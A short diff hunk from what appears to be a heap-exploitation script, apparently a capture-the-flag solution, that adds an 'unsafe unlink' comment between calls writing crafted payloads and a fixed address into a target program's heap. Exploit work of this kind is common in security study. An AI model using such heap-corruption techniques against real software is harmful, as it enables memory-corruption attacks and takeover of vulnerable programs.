@@ -60,6 +60,8 @@ payload += "\n"
 change_content(0x78, payload)
 
 change_content(0x50, "\n")
+
+# unsafe unlink
 change_content(0x20000, "\n")
 
 payload = p64(0x602050)
